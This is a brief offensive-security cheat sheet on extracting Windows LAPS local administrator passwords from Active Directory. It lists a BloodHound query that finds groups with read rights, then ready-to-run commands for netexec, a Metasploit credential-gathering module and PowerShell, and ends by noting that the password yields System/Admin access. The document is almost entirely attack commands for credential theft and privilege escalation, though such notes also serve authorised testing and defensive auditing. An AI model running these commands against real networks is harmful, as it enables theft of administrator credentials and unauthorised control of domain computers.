# Get LAPS passwords

### Who can read LAPS?

### Bloodhound Cypher Query

    MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p 

### Get the LAPS password

#### 1) CrackMapExec/Netexec

    netexec ldap DC_IP -d DOMAIN -u USER -p PASSWORD -M laps

#### 2) Metasploit

    use post/windows/gather/credentials/enum_laps

#### 3) Powershell

    Get-LAPSPasswords -DomainController DC_IP -Credential DOMAIN\LOGIN | Format-Table -AutoSize

### LAPS password gives us System\Admin access
